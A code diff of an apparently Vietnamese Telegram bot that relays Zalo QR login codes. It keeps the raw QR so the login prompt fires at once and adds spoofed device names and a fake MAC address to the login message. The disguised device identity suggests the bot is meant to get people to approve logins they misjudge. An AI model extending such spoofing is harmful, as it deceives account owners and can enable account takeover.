@@ -91,6 +91,8 @@ def get_horizontal_menu_banner_bytes() -> bytes:
 
 
 def add_border_to_qr(image_data: bytes) -> bytes:
+    # Giữ nguyên 100% ảnh PNG QR gốc từ id.zalo.me để camera Zalo nhận diện tức thì và hiện ngay thông báo yêu cầu đăng nhập từ máy tính
+    return image_data
     if not HAS_PIL:
         return image_data
     try:
@@ -496,7 +498,7 @@ class DirectTelegramBotRunner:
                             f"━━━━━━━━━━━━━━━━━━━━━━\n"
                             f"🖥️ <b>Thiết bị:</b> <code>{pc_lbl}</code>\n"
                             f"📍 <b>Vị trí:</b> <code>{reg_lbl}</code>\n"
-                            f"🌐 <b>IP Định Tuyến:</b> <code>{vn_ip}</code>\n"
+                            f"🌐 <b>IP Định Tuyến:</b> <code>{vn_ip}</code> | <b>MAC:</b> <code>{ev_data.get('mac_address', 'A4:83:E7:VN')}</code>\n"
                             f"⏳ <b>Hiệu lực:</b> 100 giây\n\n"
                             f"👉 <i>Mở ứng dụng Zalo trên điện thoại ➔ Quét mã QR ➔ Bấm <b>Đăng nhập</b> để vào thẳng tài khoản &amp; ghim thiết bị sống lâu nhất!</i>\n"
                             f"👑 <b>Dev:</b> Phan Anh Khôi (Rike) • <code>helloword2102</code>"
@@ -751,6 +753,12 @@ class DirectTelegramBotRunner:
                 "dn": "vn_dn",
                 "danang": "vn_dn",
                 "mac": "vn_mac",
+                "macair": "vn_mac_air",
+                "imac": "vn_imac",
+                "macstudio": "vn_mac_studio",
+                "dell": "vn_dell_xps",
+                "thinkpad": "vn_thinkpad",
+                "hp": "vn_hp_spectre",
             }
             reg_code = reg_map.get(reg_arg, "sg_vip")
             custom_pc = " ".join(args[1:]) if (cmd == "/qr" and len(args) > 1) else ""
